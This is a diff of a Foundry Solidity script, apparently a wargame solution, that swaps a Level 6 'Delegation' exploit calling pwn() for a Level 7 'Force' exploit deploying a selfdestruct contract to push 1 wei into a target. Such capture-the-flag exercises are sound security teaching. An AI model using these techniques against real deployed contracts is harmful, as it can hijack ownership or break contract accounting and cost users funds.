@@ -3,26 +3,18 @@ pragma solidity ^0.8.18;
 
 import {Script, console} from "forge-std/Script.sol";
 import {HelperFunctions} from "script/HelperFunctions.s.sol";
-
-interface IDelegate {
-    function pwn() external;
-}
+import {Selfdestruct} from "../src/Level7.sol";
 
 // ================================================================
-// │                        LEVEL 6 - DELEGATION                  │
+// │                          LEVEL 7 - FORCE                     │
 // ================================================================
 contract Exploit is Script, HelperFunctions {
     function run() public {
         address targetContractAddress = getInstanceAddress();
-        IDelegate targetContract = IDelegate(targetContractAddress);
 
         vm.startBroadcast();
-        // Using interface:
-        targetContract.pwn();
-
-        // Without interface:
-        // targetContractAddress.call(abi.encodeWithSignature("pwn()"));
-
+        Selfdestruct targetContract = new Selfdestruct();
+        targetContract.attack{value: 1 wei}(targetContractAddress);
         vm.stopBroadcast();
     }
 }
